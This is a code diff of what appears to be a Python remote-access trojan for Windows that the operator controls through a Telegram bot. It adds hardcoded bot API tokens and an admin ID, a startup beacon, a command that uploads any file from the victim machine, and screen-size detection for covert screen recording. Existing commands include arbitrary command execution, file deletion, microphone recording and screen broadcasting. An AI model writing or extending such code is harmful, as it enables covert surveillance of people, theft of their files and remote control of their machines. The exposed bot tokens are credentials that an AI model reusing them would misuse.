@@ -11,6 +11,7 @@ import os
 
 import numpy as np
 
+from ctypes  import windll
 from telebot import TeleBot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from PIL import Image
@@ -18,18 +19,27 @@ import moviepy.editor as moviepy
 
 # Variables
 
-
-API_TOKEN = <token>
-ADMIN = <id>
+# API_TOKEN = "6652240740:AAFWOW8p2xrv1rPlX8emG9iB_dE1l3o9bJY" # Yretra3
+# API_TOKEN = "6330536047:AAH618gGp8RiCjNCUO4YDBxRgTKl5zICBL4" # Yretra2
+# API_TOKEN = "6433586121:AAFtw6FK9PyPY5UbhtW-VtuGCFbuCh9y7Uk" # Yretra1
+API_TOKEN = "6595505598:AAEqCuUCGfxVbVlu9_HVKFRXG1ULL7PeJGE" # TEST
+ADMIN = 804011643
 
 filename_audio = "recorded_audio.wav"
-filename_video = "recorded_video.avi"
-filename_video2 = "recorded_video2.avi"
+filename_video = "video1.avi"
 filename_screenshot = "screenshot.jpg"
 
-SREEN_SIZE = (1920, 1080)
+while True:
+    if os.path.exists(filename_video):
+        index = filename_video[5:-4]
+        filename_video = filename_video[:-5] + str(int(index) + 1) + ".avi"
+    else:
+        break
+
+width = windll.user32.GetSystemMetrics(0)
+height = windll.user32.GetSystemMetrics(1)
+SREEN_SIZE = (width, height)
 fourcc = cv2.VideoWriter_fourcc(*"XVID")
-start = True
 
 chunk = 2048
 FORMAT = pyaudio.paInt16
@@ -38,13 +48,15 @@ sample_rate = 44100
 
 bot = TeleBot(API_TOKEN)
 
+bot.send_message(ADMIN, "ON ✅")
+
 markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
            KeyboardButton("dir"), KeyboardButton("del"),
            KeyboardButton("type"), KeyboardButton("get_file"),
            KeyboardButton("exec_cmd"), KeyboardButton("record_audio"),
            KeyboardButton("dump_audio"), KeyboardButton("record_video"),
-           KeyboardButton("avi_to_mp4"), KeyboardButton("screenshot"),
+           KeyboardButton("get_video"), KeyboardButton("screenshot"),
            KeyboardButton("screen_broadcast"))
 
 
@@ -203,6 +215,25 @@ def get_file(ms):
 
     bot.register_next_step_handler(ms, get_file_next)
 
+def get_video(ms):
+    markup_video = ReplyKeyboardMarkup()
+    create_markup(markup_video)
+    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_video)
+    
+    @bot.message_handler(content_types=["text"])
+    def get_video_next(ms):
+        if ms.text != "None":
+            try:
+                path = ms.text
+                bot.send_video(ADMIN, open(path, "rb"))
+            except Exception as e:
+                bot.send_message(ADMIN, f"Error:\n{e}")
+
+        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
+        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
+
+    bot.register_next_step_handler(ms, get_video_next)
+
 def exec_cmd(ms):
     bot.send_message(ADMIN, "Enter command...")
 
@@ -273,40 +304,33 @@ def dump_audio():
 
 def record_video(ms):
     bot.send_message(ADMIN, "Recording 🎲", reply_markup=markup)
-    out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
     
+    out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
     while True:
-        image = pyautogui.screenshot()
-        image = np.array(image)
+        frame = pyautogui.screenshot()
+        frame = np.array(frame)
         
-        frame = image
         frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
         out.write(frame)
 
-    bot.send_message(ADMIN, "Finished ✅")
-    cv2.destroyAllWindows()
-    out.release()
+# def avi_to_mp4(ms):
+#     with open(filename_video, "rb") as video:
+#         bot.send_message(ADMIN, "convert to mp4...")
 
-def avi_to_mp4(ms):
-    """
-    Получение всех элементов в список, дальнейшая конвертация
-    всем элементов с списке по именам и отправка в тг
-    """
+#         cv2.destroyAllWindows()
+#         out.release()
+
+#         clip = moviepy.VideoFileClip(filename_video)
+#         clip.write_videofile("recorded.mp4", logger=None)
+#         clip.close()
     
-    # bot.send_message(ADMIN, "convert to mp4...")
-
-    # ...
-
-    # clip = moviepy.VideoFileClip(filename_video)
-    # clip.write_videofile("recorded.mp4", logger=None)
+#         os.remove(filename_video)
     
-    # os.remove(filename_video)
-    
-    # with open("recorded.mp4", "rb") as video:
-    #     bot.send_message(ADMIN, "Success ✅")
-    #     bot.send_video(ADMIN, video)
+#     with open("recorded.mp4", "rb") as video:
+#         bot.send_message(ADMIN, "Success ✅")
+#         bot.send_video(ADMIN, video)
 
-    # os.remove("recorded.mp4")
+#     os.remove("recorded.mp4")
 
 def screenshot():
     myScreenshot = pyautogui.screenshot()
@@ -392,8 +416,8 @@ def CheckCommand(ms):
         elif ms.text == "record_video":
             record_video(ms)
         
-        elif ms.text == "avi_to_mp4":
-            avi_to_mp4(ms)
+        elif ms.text == "get_video":
+            get_video(ms)
 
         elif ms.text == "screenshot":
             screenshot()
